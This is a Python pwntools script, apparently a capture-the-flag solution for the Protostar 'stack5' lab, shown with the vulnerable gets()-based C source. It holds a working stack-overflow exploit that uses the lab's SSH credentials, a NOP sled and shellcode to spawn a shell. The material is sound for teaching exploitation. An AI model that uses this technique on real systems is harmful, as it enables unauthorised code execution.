'''
Source:
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
'''

from pwn import *
import os

def getEIP():

    s = ssh(host='protostar',\
            user='user',\
            password='user')

    # Retieve the file and pull the function address
    f = open('stack5', 'wb')
    f.write(s.download_data(BINPATH))
    f.close()
    os.chmod('stack5', stat.S_IRWXU)

    p = process('./stack5')
    p.sendline(cyclic(100))
    p.wait()

    return Coredump('core').eip

BINPATH = '/opt/protostar/bin/stack5'

offset = cyclic_find(p32(getEIP()))
#offset = 76
shellcode = asm(shellcraft.sh())

if args.REMOTE:

    p = ssh(host='protostar',\
            user='user',\
            password='user')
    p.run(BINPATH)
    eip_address = p32(0xbffffd50)

else:
    
    p = process('./stack5')
    eip_address = p32(0xffffd360)


payload = 'A' * offset + eip_address + '\x90' * 128 + shellcode

# gdb.attach(p)
p.sendline(payload)
p.interactive()

os.remove('stack5')
os.remove('core')
